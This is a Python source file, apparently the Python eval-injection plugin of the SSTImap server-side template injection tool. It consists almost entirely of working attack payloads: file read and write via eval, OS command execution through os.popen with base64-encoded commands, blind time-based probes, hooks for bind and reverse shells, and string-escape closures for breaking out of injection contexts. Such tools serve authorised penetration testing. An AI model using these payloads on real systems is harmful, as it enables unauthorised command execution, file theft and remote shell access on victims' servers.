from core.plugin import Plugin
from utils import closures
from core import bash
from utils import rand


class Python(Plugin):
    header_type = "add"
    priority = 8
    plugin_info = {
        "Description": """Eval injections in Python. Base for Python-based template engines""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap plugin
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
    }

    def language_init(self):
        self.update_actions({
            'render': {
                'render': """{code}""",
                'header': """str({header[0]}+{header[1]})+""",
                'trailer': """+str({trailer[0]}+{trailer[1]})""",
                'test_render': f"""str('{rand.randstrings[0]}'.join('{rand.randstrings[1]}'))""",
                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
            },
            'render_error': {
                'render': """{code}""",
                'header': """getattr("", str({header[0]}+{header[1]})+str(""",
                'trailer': """).rstrip()+str({trailer[0]}+{trailer[1]}))""",
                'test_render': f"""str('{rand.randstrings[0]}'.join('{rand.randstrings[1]}'))""",
                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
            },
            'write': {
                'call': 'evaluate',
                'write': """open("{path}", 'ab+').write(__import__("base64").urlsafe_b64decode('{chunk_b64}'))""",
                'truncate': """open("{path}", 'w').close()"""
            },
            'read': {
                'call': 'evaluate',
                'read': """__import__("base64").b64encode(open("{path}", "rb").read())"""
            },
            'md5': {
                'call': 'evaluate',
                'md5': """__import__("hashlib").md5(open("{path}", 'rb').read()).hexdigest()"""
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """str({code})""",
                'test_os': """'-'.join([__import__('os').name, __import__('sys').platform])""",
                'test_os_expected': r'^[\w-]+$'
            },
            'execute': {
                'call': 'evaluate',
                'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode()).read()""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2] 
            },
            'blind': {
                'call': 'evaluate_blind',
                'test_bool_true': """'a'.join('ab') == 'aab'""",
                'test_bool_false': 'True == False'
            },
            'evaluate_blind': {
                'call': 'evaluate',
                'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode()) and __import__('time').sleep({delay})"""
            },
            'bind_shell': {
                'call': 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell': {
                'call': 'execute_blind',
                'reverse_shell': bash.reverse_shell
            },
            'execute_blind': {
                'call': 'evaluate',
                'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode() + ' && sleep {delay}').read()"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # Code context escape with eval() injection is not easy, since eval is used to evaluate a single 
            # dynamically generated Python expression e.g. eval("""1;print 1"""); would fail.
            # TODO: the plugin should support the exec() injections, which can be assisted by code context escape
        ])

    language = 'python'


ctx_closures = {
        1: [
            closures.close_single_double_quotes + closures.integer,
            closures.close_function + closures.empty
        ],
        2: [
            closures.close_single_double_quotes + closures.integer + closures.string,
            closures.close_function + closures.empty
        ],
        3: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.close_triple_quotes,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        4: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.close_triple_quotes,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        5: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.close_triple_quotes,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty,
            closures.close_function + closures.close_list + closures.empty,
            closures.if_loops + closures.empty
        ],
}

